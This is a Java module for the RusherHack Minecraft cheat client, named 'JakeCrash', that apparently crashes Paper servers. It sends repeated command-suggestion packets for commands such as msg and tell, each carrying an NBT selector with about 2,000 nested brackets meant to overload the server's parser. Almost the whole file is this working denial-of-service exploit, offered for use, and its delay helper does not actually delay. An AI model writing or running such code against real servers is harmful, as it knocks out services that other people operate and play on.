package org.op;
import com.google.gson.JsonObject;
import net.minecraft.network.protocol.game.ServerboundCommandSuggestionPacket;
import org.rusherhack.client.api.events.client.EventUpdate;
import org.rusherhack.client.api.feature.module.ModuleCategory;
import org.rusherhack.client.api.feature.module.ToggleableModule;


import org.rusherhack.core.event.subscribe.Subscribe;
import org.rusherhack.core.setting.NumberSetting;

import java.util.Objects;


public class PaperCrash extends ToggleableModule {

    /**
     * Variables
     */
    private final NumberSetting<Integer> levels = new NumberSetting<>("levels", 2044, 0, 5000);

    public PaperCrash() {
        super("JakeCrash", "crash for paper servers", ModuleCategory.CLIENT);


        this.registerSettings(
                this.levels
        );
    }

    private int messageIndex = 0;
    private final String[] knownWorkingMessages = {
            "msg",
            "minecraft:msg",
            "tell",
            "minecraft:tell",
            "tm",
            "teammsg",
            "minecraft:teammsg",
            "minecraft:w",
            "minecraft:me"
    };

    @Subscribe
    private void onUpdate(EventUpdate event) {

        if (messageIndex == knownWorkingMessages.length - 1) {
            messageIndex = 0;
            this.toggle();
            return;
        }

        wait(1000);
        String nbtExecutor = " @a[nbt={PAYLOAD}]";
        String knownMessage = knownWorkingMessages[messageIndex] + nbtExecutor;
        int len = 2044 - knownMessage.length();
        String overflow = generateJsonObject(len);
        String partialCommand = knownMessage.replace("{PAYLOAD}", overflow);
        int packets = 3;
        for (int i = 0; i < packets; i++) {
            Objects.requireNonNull(mc.player.connection).send(new ServerboundCommandSuggestionPacket(0, partialCommand));
        }
        messageIndex++;

    }
    //thx to fesis for free code I pasted
    private void wait(int i) {
        new Thread(() -> {
            try {
                Thread.sleep(i);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
        }).start();
    }

    private String generateJsonObject(int levels) {
        return "{a:" + "[".repeat(Math.max(0, levels)) + "}";
    }

}